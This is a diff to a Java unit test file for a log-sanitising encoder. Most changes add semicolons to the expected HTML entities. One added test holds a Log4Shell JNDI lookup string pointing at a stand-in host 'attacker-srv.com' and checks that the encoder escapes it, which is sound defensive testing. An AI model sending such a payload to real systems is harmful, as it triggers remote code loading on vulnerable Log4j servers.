@@ -51,7 +51,7 @@ class EncodersTests {
   void forLogContent_oneElementArray_successfullyWithResult() {
 
     String[] oneElementStringArray = new String[] {"Barbi\n\r\t><"};
-    String[] expectedEncodedArray = new String[] {"Barbi___&gt&lt"};
+    String[] expectedEncodedArray = new String[] {"Barbi___&gt;&lt;"};
 
     String[] actualEncodedArray = Encoder.forLogContent(oneElementStringArray);
     Assertions.assertArrayEquals(expectedEncodedArray, actualEncodedArray);
@@ -62,7 +62,7 @@ class EncodersTests {
   void forLogContent_threeElementArray_successfullyWithResult() {
 
     String[] threeElementStringArray = new String[] {"I\n\r\t", "am>", "Barbi<"};
-    String[] expectedEncodedArray = new String[] {"I___", "am&gt", "Barbi&lt"};
+    String[] expectedEncodedArray = new String[] {"I___", "am&gt;", "Barbi&lt;"};
 
     String[] actualEncodedArray = Encoder.forLogContent(threeElementStringArray);
     Assertions.assertArrayEquals(expectedEncodedArray, actualEncodedArray);
@@ -77,7 +77,7 @@ class EncodersTests {
     results.add("I\n\r\t");
     results.add("am>");
 
-    String[] expectedEncodedArray = new String[] {"I___", "am&gt", "Barbi&lt"};
+    String[] expectedEncodedArray = new String[] {"I___", "am&gt;", "Barbi&lt;"};
 
     List<String> actualEncodedArray = Encoder.forLogContent(results);
     Assertions.assertEquals(actualEncodedArray.iterator().next(), Arrays.stream(expectedEncodedArray).iterator().next());
@@ -87,7 +87,7 @@ class EncodersTests {
   void forLogContent_fullEncodingCapabilities_successfullyWithResult() {
 
     String barbi = "Barbi\n\r\t><";
-    String expected = "Barbi___&gt&lt";
+    String expected = "Barbi___&gt;&lt;";
 
     String actual = forLogContent(barbi);
     Assertions.assertEquals(expected, actual);
@@ -97,6 +97,16 @@ class EncodersTests {
   void forLogContent_null_successfully() {
 
     Assertions.assertNull(forLogContent((Object) null));
+  }
+
+  @Test
+  void forLogContent_actual_tainted_log4j_successfully() {
+
+    String barbi = "${jndi:ldap://attacker-srv.com/foo}";
+    String expected = "&dollar;{jndi:ldap://attacker-srv.com/foo}";
+
+    String actual = forLogContent(barbi);
+    Assertions.assertEquals(expected, actual);
   }
 
   @Test
